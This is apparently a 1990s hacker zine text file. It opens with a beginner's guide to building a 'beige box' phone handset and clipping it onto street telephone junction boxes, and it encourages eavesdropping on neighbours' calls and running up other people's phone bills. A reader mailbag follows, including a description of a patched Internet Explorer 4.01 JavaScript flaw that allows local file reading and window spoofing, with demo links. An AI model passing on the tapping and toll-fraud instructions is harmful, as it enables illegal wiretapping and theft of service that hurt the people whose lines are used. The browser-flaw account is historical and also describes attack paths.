              please do not take this as a definitive guide. I know
              this subject has been covered before, but I feel this is
              a good subject to start with. 

<*> So what's Beige Boxing then? 

Beige boxing is the phone you see your average BT engineer carrying.
It is called a linesman's handset. There are lots of uses for a beige
box and, although almost everyone knows how to beige box, there are
some that don't, making this file a worthwhile one.

<*> So what exactly will I need? 

You will need the following to construct a permanent beige box: 

1. A cheap phone. A fine one would be Arg0s Cat. No. 550/1054 

2. A pair of crocodile clips. 

3. A pair of wire clippers. 

4. A screw driver. 

5. Soldering iron. 

6. An extra phone cord. 

<*> So how is the damn thing made? 

Step #1 - Open up your telephone with your screw driver. Be sure not to
          do this with too much force as you don't want to leave things
          loose. 

Step #2 - Look at the insides of your phone, you should see a green & a
          red wire. These are the ones we are interested in. Follow
          them back to the screw/pin (usually a screw although I have
          seen a pin, which had to be removed completely) and then
          solder your phone cord to the screws, and solder it down. 

Step #3 - Run your extra telephone cord out the whole modular jack's
          hole. Sometimes you can't get it through (cough) so you
          should cut the wires that lead to it with your wire cutters
          to leave plenty of room. 

Step #4 - Put your phone back together and make sure it's securely
          fastened. 

Step #5 - At the end of your extra phone cord, which is now hanging
          out of the phone, connect your set of croc clips to the same
          wires hooked up to the screws inside your telephone. You can
          connect them by soldering. 

<*> What can I do with the thing now I've made it? 

So now you have made your first beige box you'll want to use it,
correct? NO! That's illegal and I can take no responsibilty for what
you do with your newly constructed beige boxe. If you were doing it for
official purposes however you would go outside, and somewhere on your
street you should see a big green box. Find a remote one and take a
wrench to it. Inside the box, you should see four screws with the red &
green wires connected to them. You would then hook the croc clips up to
the screws. This is the bit where you put your phone to your ear and
hope you hear a dial tone. Enjoy the feeling if you do! If you didn't,
make sure the box is connected properly and that you're hooked up to 
the right terminals. If you *still* don't get one it's my fault, and
you haven't made your box properly :( If you did get a dial tone and
can't work out the next step please ask for detailed instructions on
the alt.2600 newsgroup :) 

<*> Anything else? 

Yes! You can effectively use your beige box to tap into a neighbour or
enemy's phone line. When you connect up your nice little beige box and
you hear a voice its the line being used, and you can here third party
to whatever they are saying, but I'm not sure if you do speak they will
be able to hear you... 

A good idea is to make a map of all the phones that go into your green
box. So you can decide who's bill you'd like to be slightly higher, but
don't call anything too extravagant or they will click they haven't
actually phoned this number, know what I mean? 

Conclusion: I don't know very much about beige boxing, but that is what
            I do know. I hope it helped someone out there :) I have
            read a good few files on this subject, hopefully making
            this text accurate. If this is not correct please feel free
            to e-mail me telling me so. This was not meant as a
            comprehensive guide, as it isn't a very deep subject. Just
            to give all the newbies out there a decent clue as to what
            is going on.

<*> Another month goes by, another shitload of e-mails pour in. E-mail
us an intelligent, correctly spelled mail and we promise no more
sarcastic reaponses :). Did you notice the massive ascii art logo
greeting you as you opened this text file? Our heart felt thanks goes
out to our old buddy GPF#2 who designed it in his spare time. Moving
right along, here is this months mailbag. The e-mails are arranged in
the order of the date they were received.

                       :..This Is A Mans World.:

From: "Jerry Stevens" <theman@coldmail.com>
To: under_p@yahoo.com
Subject: up mag

helo MAN!

i just read all of up. good one. what do i have to do to to be put in
the shout outs section. make me a shout out plz.

jerry (-the-man-)

                        <*> <*> <*> <*> <*> <*>

Sorry to tell you that the Shout Outs To section, renamed Greetings To,
is reserved for friends of staff members and/or people who have helped
out this magazine in the past. That includes people who have recently
submitted articles or agreed to be a second host. I don't think you'd
fit in well due to your repeated use of the word "man". People should
not be judged on terms of their gender. We are targeting women just as
much as men even though they are seen as a minority in the underground.

                       :...Java Security Hole..:

From: darkflame <darkflame@zetnet.co.uk>
To: zengus@yahoo.com 
Subject: -UP- text file. 

As a possible future writer for -UP- I thought I would elaborate for
the benefit of everyone on a Java security hole recently posted to
comp.security.misc.

Java Script Security Hole adapted from a post found on
comp.security.misc by guninski@hotmail.com

It has recently been noticed that there is a Javascript security bug in
Internet Explorer 4.01. This has subsequently been patched. This opens
up several security holes.

The bug is: if '%01someURL' is added after the URL, Microsoft Internet 
Explorer interprets this that the document is loaded from the domain of
'someURL'.  

Some possible security flaws this could effect are:

1) Microsoft Internet Explorer allows reading local files and sending
them to an arbitrary server. The filename, however, must be known to
the intruder. According to Guninski The bug may be exploited using HTML
mail message. The Demo is available at:

http://www.geocities.com/ResearchTriangle/1711/read3.html

This works on IE 4.0 also.

2) Microsoft Internet Explorer allows "window spoofing". After visiting
a hostile page (or clicking a hostile link) a window is opened and its 
location has now become a trusted site. However, the content of the
window is not that of the original site, but it is supplied by the
owner of the page. So, the user is misled he is browsing a trusted
site, while he is browsing a hostile page and may provide sensitive
information, such as credit card numbers. The bug may be exploited
using HTML mail message. Demo is available at:

http://www.geocities.com/ResearchTriangle/1711/read4.html

Workaround: Disable Javascript

Thanks for the input. As you can all see Darkflame has joined the team
to become a permanent writer here. He will surely write us many good
articles when he's not plugging education :P.

This is a reply to a newsgroup message that was posted months ago. We
replied to Kamal personally with the URL and told him that we would
greatly appreciate if any interested parties contributed. Although we
need no more official or permanent writers we rely heavily on
independent contributions as always. We liked the quotes as well.
